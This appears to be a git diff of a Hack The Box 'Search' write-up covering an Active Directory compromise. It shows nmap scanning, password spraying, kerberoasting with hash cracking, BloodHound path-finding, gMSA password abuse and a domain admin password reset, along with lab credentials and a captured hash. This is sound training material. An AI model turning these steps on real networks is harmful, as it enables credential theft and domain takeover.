@@ -18,7 +18,8 @@ tags:
   - Web Powershell
   - Abusing ReadGMSAPassword
 ---
-I start with nmap scanning open ports in the machine, take all open ports and then making a more exaustive scan.
+**Hackthebox - Search - Writeup**
+Lets begin with a tcp port scan using nmap to discover open ports in the machine.
 
 ```console
 nmap --open -p- -sS --min-rate 4000 -vvv -n -Pn -oG allPorts 10.10.11.129
@@ -49,7 +50,10 @@ Discovered open port 636/tcp on 10.10.11.129
 Discovered open port 8172/tcp on 10.10.11.129
 Discovered open port 49727/tcp on 10.10.11.129
 ```
-now lets scan more deeply these ports we found to use some basic scripts and see the version they using.
+now lets scan more deeply these ports we found to use some basic scripts and see the service and the version they running.
+Before that, i have these utility that extract all the importan information and copy the ports in the clipboard. 
+So you dont need to write all of them.
+If you want this tool copy this code and paste it in your .bashrc or your .zshrc 
 ```console
 which extractPorts | bat -l bash
 extractPorts () {
@@ -65,9 +69,7 @@ extractPorts () {
   11   │ }
 
 ```
-I have these utility that extract all the importan information and copy the ports to the clipboard.
-So now with all the ports copied we do the scan.
-```colsone
+```console
 nmap -sCV -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,8172,9389,49666,49669,49670,49692,49703,49727 -oN targeted 10.10.11.129
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-07 10:08 UTC
 Nmap scan report for search.htb (10.10.11.129)
@@ -145,7 +147,7 @@ Host script results:
 |_    Message signing enabled and required
 
 ```
-We see a lot of ports so we start with basic recognizement
+Theres a lot of ports so lets start with basic recognizement.
 ```console
    /home/h/De/h4rticx/HTB/search/nmap    smbmap -u "" -H 10.10.11.129 --no-banner
                                                                                                     
@@ -158,12 +160,12 @@ SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763
    ~/Desktop/h4rticx/HTB/search/nmap  rpcclient -U "" 10.10.11.129 -N -c 'enumdomusers'
 result was NT_STATUS_ACCESS_DENIED
 ```
-We cant connect to smb with null session but see domain name search.htb so we add it in /etc/hosts, check rdp with null session but access denied, so we go check the web.
-Analycing the web i notice a weird image, so i check it up in a new tab with more zoom.
+I cant connect to smb with null session but i saw the domain name "search.htb" so we add it in /etc/hosts, check rdp with null session but access denied, so we go check the web.
+Analycing the web i noticed a weird image, so i check it up in a new tab with more zoom.
 ![image found](/assets/images/weird.png)
-Found Hope sharp and password "IsolationIsKey?" so because i dont know the user i make a list with posible users.
+Found user "Hope sharp" and password "IsolationIsKey?", but i dont know the user policy they using so i brute force and i create a diccionary with posibles combinations.
 ![image user](/assets/images/hopesharpuser.png)
-And the try with crackmapexec who is the good one.
+Then use crackmapexec to check which is the good one.
 ```console
     ~/Desktop/h4rticx/HTB/search/content  crackmapexec smb 10.10.11.129 -u users.txt -p "IsolationIsKey?"
  SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
@@ -172,7 +174,7 @@ SMB         10.10.11.129    445    RESEARCH         [-] search.htb\h.sharp:Isola
 SMB         10.10.11.129    445    RESEARCH         [-] search.htb\hope.s:IsolationIsKey? STATUS_LOGON_FAILURE 
 SMB         10.10.11.129    445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey? 
 ```
-hope.sharp is the correct user so we try get more info with rpd and sbm now we have credentials.
+hope.sharp is the correct one so we use rpd and smb to get more information now we have credentials.
 ```console
 ❯ smbmap -u 'hope.sharp' -p 'IsolationIsKey?' -H 10.10.11.129 -r 'RedirectedFolders$' --no-banner
                                                                                                     
@@ -253,15 +255,15 @@ user:[Payton.Harmon] rid:[0x4ab]
 user:[Trace.Ryan] rid:[0x4ac]
 ....
 ```
-A lot of stuff so we filter what is inside of [] and save it in users.txt
+A lot of stuff but we only need the usernames so we filter what is inside of [] and save it in users.txt
 ```console
    ~/Desktop/h4rticx/HTB/search/content  rpcclient -U 'hope.sharp%IsolationIsKey?' 10.10.11.129 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v 0x | tr -d '[]' > users.txt
 ```
-We try if some user in the list is vulnerable to ASREPRoast attack
-```colsone
+Now with the users file lets test if some user in the list is vulnerable to ASREPRoast attack
+```console
 ❯ GetNPUsers.py -usersfile users.txt search.htb/
 ```
-But is not vulnerable. So i tried kerberoasting attack and gaining a TGS with the authentication i have.
+But they are not. So i tried kerberoasting attack and gaining a TGS with hope.sharp authentication i have.
 ```console
 ❯ GetUserSPNs.py search.htb/hope.sharp
 Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
@@ -285,7 +287,7 @@ RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 12:59:11.329031
 
 [-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 ```
-But we get that error because we need to syncronice with the server so i use ntpdate.
+But we run into this error because we need to syncronice the clock with the server so i use ntpdate.
 ```console
 ❯ sudo ntpdate 10.10.11.129
  7 May 11:19:40 ntpdate[19962]: step time server 10.10.11.129 offset +1158.214479 sec
@@ -303,7 +305,7 @@ RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 12:59:11.329031
 $krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$9e9223c971dd5d99875ca1dfd979cdb5$be9aa0663b5a5258e3371cc721487558a29e1a7446ac00114bb66d9f6025fe8b8ffd9aba5c7207f11f50d57cff62bef2e877ec2c122cb6f9444173dd986cee43211782715a0b799d3d220b25999709091b84abc0968bcaa184b00b10325e5ed10f91f90985b90d70fd9997fdcb4923d38be82415e04846fc408015e61f49ae0e0b6efa3da9d92d5c588c076245803f87da74e7384119cb786b3a21c6bd661583c3d35c909108e94a1f6f2bd7e8f3d75e6861a180baaee0dbbccede47dbc7246f031df6891fbce5c48634017c80e66ebca74624b76a39ca18187a01a2b7afc4e21174b1f2e8323c83ee69271c776434743d4da46f6f42c1f65c36ac34eb5d6229e532c2dd6d808db2ceede45d9fe0c8183ca8460f54513ac5d2175776a3372df430c98ef1c8f88adb67a0b85b0190c79ed65f572cb54180eb2c1b0602a2663c950b71b8b71fb1dde35906f7e5917fde41328cab3351545094db7748f23b528cf8781ceb172d9ef361f237bbb4a6f898f3cc46a5ced33e628d82f915f9e145e3b92815abb1aebcc0c426f505cd41146c680d79805ee4aeca3a929438ea26ab48dd38def71da5a54c21e9f8f66cef939cd157992fae652277abfc05ea1e21a6bfacac7c7d5471547fcf5344517ff9860dace2d13a7a8f94ac1d420c2a8dc5e6008a768d2a281f9ff08c9b5ebb5ac1b12f37ec73792e3735634f13ebe77c2c1acec457d138c7bb7a286317e24c3f25dad05260ca9ddcf5bb4fad527bd9a9ec8980440bc18fe626381ab003cbdbeeec54429f40dc382e0bdb99a13c99a2d28c4e9e4191d0878a110e3e714d229009ca8391951dede95ef9f1d9e9b36d7800cdd23a959b6d3930d120d575e416dafac32e4647586731fb0c01c1b8f62e75f8eb0e14d3c31dc3fd584a7274d75590ead52a9fa84390d52810bbd611f2d985ecb5f13a1c210d9e9aa631a757f231b520095ff090da11f815cef615dcd08721d0b87d59c2c87b6385b23300566cc7d97e81ff2db689aeb31b22109c801b1e1d5ce79167aa4fb4d1718299e83c065f64baf2e67529b9d13bf1c54cfd4bcd307ed4b3f988ea2a13c503e8b8193e197db90c8b0ad4b56b5db022c392403ecd6b76b24440f5ec4936c4608f346490d26709e132aced32a51e458e459ce52aadf9b836e34938f0a1d31c0c3b64840df4a5772574fca2ec5bc39d23be737a7ea9ff22a67eeeb1fd324f1e91a7cd5f065490318747aedc8a1d67d145d10c44cc2b5fe92fc69f9545bb2594dfa26e44f80643eccaf0aaa663ba48fda3ba023b7baf5b1700d9c5b1d9b78e7a5ad5f8cab24c37ccc50a31223f43b07245aa460932768a33524ff9cc7017d04247fe65680c930864dfe805be12458cd902b6d2106a9915b6d8374ad03cef5d0a7fd3f818891b95adb90dc2bf9f4c2c92bc75c029ff089bd7a7801b23de5ddfe95b2452d59babaf1ff329ba97901369c1b0e5
 
 ```
-Use john to crack the password
+Use john the ripper to crack the password.
 ```console
 ❯ john -w:/usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt hash
 [archlinux:20199] [[34662,0],0] ORTE_ERROR_LOG: Data unpack would read past end of buffer in file util/show_help.c at line 501
@@ -316,7 +318,7 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
-Now try if other user in using the same password with crackmapexec
+Now we have these new credential lets 
 ```console
 ❯ crackmapexec smb 10.10.11.129 -u users.txt -p "@3ONEmillionbaby" --continue-on-success
 SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
@@ -433,7 +435,7 @@ Archive:  phishing_attempt.xlsx
 ```
 ![image libreoffice2](/assets/images/libreoffice2.png)
 
-Open the Document.xlsx and u have the credentials.
+If you open now the document.xlsx you can watch the credentials.
 
 ![image user](/assets/images/libreoffice3.png)
 create credentials.txt with the creds and a user.txt with the users and use crackmapexec.
@@ -455,7 +457,7 @@ SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Abby.Gonzalez
 SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Joy.Costa:**30*venus*BALL*office*42** STATUS_LOGON_FAILURE 
 SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Vincent.Sutton:**24&moment&BRAZIL&members&6
 ```
-Found that Sierra.Fry has a correct password so we try smbmap to see if she had Something in his Desktop
+Found that Sierra.Fry has a correct password so we try smbmap to see if she had Something in his folders
 ```console
 ❯ smbmap -u 'sierra.frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' -H 10.10.11.129  -r 'RedirectedFolders$/sierra.frye/Downloads/Backups' --no-banner
                                                                                                     
@@ -469,11 +471,10 @@ Found that Sierra.Fry has a correct password so we try smbmap to see if she had 
 	fr--r--r--             2643 Fri Jul 31 15:04:11 2020	search-RESEARCH-CA.p12
 	fr--r--r--             4326 Mon Aug 10 20:39:17 2020	staff.pfx
 ```
-Find backups with some pfx files, tried download it and need a password to import it in browser. So with pfx2john get hash and crack it.
-Then import the certs to the browser.
-
+Found backups with some pfx files, download it and test if i can import it in the browser, but credentials are needed. So with pfx2john get hash and crack it.
+Then import the certs in the browser.
 ![image certs](/assets/images/certs.png)
-But we dont know why we need the certs for, so we do fuzzing to found a page to use it.
+Now that we have certs we need to find a page to use them, so we do fuzzing.
 ```console
 wfuzz -c -t 200 --hh=44982 --hc=404 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://search.htb/FUZZ
 ********************************************************
@@ -497,8 +498,8 @@ ID           Response   Lines    Word       Chars       Payload
 ```
 found staff route with 403. Lets inspect that.
 ![image certs](/assets/images/staffpage.png)
-We try the sierra credentials and we are in.
-Now its time to use BloodHound, so first we use BloodHound-python and with the credentials we have we recollect all information.
+We try the sierra credentials and we are in(in domain you have to put RESEARCH, we found that early in crackmapexec).
+Now its time to use BloodHound, so first we need the js files so lets use BloodHound-python with the credentials we have.
 ```console
 ❯ python3 bloodhound.py -u 'hope.sharp' -p 'IsolationIsKey?' -d search.htb -ns 10.10.11.129 -c ALL
 INFO: Found AD domain: search.htb
@@ -512,13 +513,14 @@ INFO: Found 64 groups
 INFO: Found 0 trusts
 .....
 ```
-Import the files we get to the bloodhound and we mark the users we pwnd ass owned.
+Import the files we get to the bloodhound and mark the users we pwnd as owned.
 then we click on short path to get domain admin and we get Something like this:
 ![image certs](/assets/images/bloodhound1.png)
-Now you can see in the bloodhound that you can gain access to BIR-ADFS-GMSA via ReadGMSAPassword so in this page is explained perfectly
+Now you can see in the bloodhound that you can gain access to BIR-ADFS-GMSA via ReadGMSAPassword. So check this page that explain it perfectly.
 [Link Text]([https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/])
 So lets follow the instructions.
 ![image certs](/assets/images/powershell1.png)
+Execute net user and change tristan.davies password and get domain admin.
 ```console
    ~/Desktop/h4rticx/HTB/search/content  crackmapexec smb 10.10.11.129 -u 'tristan.davies' -p 'h4rticx123'
 SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
